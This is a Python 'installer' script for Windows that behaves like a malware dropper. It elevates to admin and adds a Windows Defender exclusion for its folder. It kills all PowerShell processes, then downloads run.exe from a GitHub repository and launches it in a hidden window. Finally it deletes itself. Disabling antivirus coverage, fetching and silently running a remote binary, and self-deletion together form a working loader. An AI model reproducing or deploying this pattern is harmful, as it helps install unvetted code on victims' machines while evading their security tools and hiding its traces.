import os
import sys
import time
import ctypes
import subprocess
import urllib.request
import json


def is_admin():
    try:
        res = ctypes.windll.shell32.IsUserAnAdmin() != 0
        print(f"Admin check: {res}")
        return res
    except Exception as e:
        print(f"Admin check failed: {e}")
        return False


def elevate_if_needed():
    dat_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    is_update = os.path.exists(dat_file)
    print(f"Checking elevation... update={is_update}, admin={is_admin()}")

    if not is_update and not is_admin():
        print("Requesting elevation...")
        script = os.path.abspath(sys.argv[0])
        params = " ".join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable if getattr(sys, "frozen", False) else sys.executable,
            f'"{script}" {params}' if not getattr(sys, "frozen", False) else params,
            None,
            1,
        )
        sys.exit(0)


def main():
    print("Starting installer")
    elevate_if_needed()

    run_dir = os.path.join(os.getenv("APPDATA"), "run")
    run_exe = os.path.join(run_dir, "run.exe")
    dat_dir = os.path.join(os.path.join(os.getenv("APPDATA"), "Microsoft"), "run")
    dat_file = os.path.join(dat_dir, "run.dat")
    temp_dir = os.path.join(os.getenv("TEMP"), "run")

    os.makedirs(run_dir, exist_ok=True)
    os.makedirs(dat_dir, exist_ok=True)
    os.makedirs(temp_dir, exist_ok=True)

    is_update = os.path.exists(dat_file)

    # Add Defender exclusion
    if not is_update:
        print("Adding Defender exclusion...")
        res = subprocess.run(
            [
                "powershell.exe",
                "-Command",
                f"Add-MpPreference -ExclusionPath '{run_dir}'",
            ],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
    else:
        print("Update detected, skipping Defender exclusion.")

    # Stop existing processes
    print("Stopping existing processes...")
    subprocess.run(
        ["taskkill", "/F", "/IM", "run.exe"], creationflags=subprocess.CREATE_NO_WINDOW
    )
    subprocess.run(
        ["taskkill", "/F", "/IM", "powershell.exe"],
        creationflags=subprocess.CREATE_NO_WINDOW,
    )
    time.sleep(2)

    # Fetch latest commit
    print("Fetching latest commit...")
    latest_commit = "main"
    try:
        req = urllib.request.Request(
            "https://api.github.com/repos/yuan-miranda/run/commits/main",
            headers={"User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            latest_commit = data.get("sha", "main")
            print(f"Commit SHA: {latest_commit}")
    except Exception as e:
        print(f"Commit fetch failed: {e}")

    # Download binary
    download_url = f"https://github.com/yuan-miranda/run/raw/{latest_commit}/run.exe"
    print(f"Downloading run.exe...")
    try:
        urllib.request.urlretrieve(download_url, run_exe)
        print(f"Download completed.")
    except Exception as e:
        print(f"Download failed: {e}")
        sys.exit(1)

    # Save state
    try:
        with open(dat_file, "w", encoding="utf-8") as f:
            f.write(latest_commit)
        print(f"Saved state.")
    except Exception as e:
        print(f"Failed saving state: {e}")

    # Launch executable directly
    print("Launching run.exe...")
    subprocess.Popen(
        [run_exe], cwd=run_dir, creationflags=subprocess.CREATE_NO_WINDOW
    )

    time.sleep(2)

    # Self delete
    self_path = os.path.abspath(sys.argv[0])
    print(f"Self-deleting...")
    if os.path.exists(self_path) and self_path.lower() != run_exe.lower():
        subprocess.Popen(
            f'cmd.exe /c timeout /t 2 >nul & del /f /q "{self_path}"',
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )

    print("Done.")


if __name__ == "__main__":
    main()
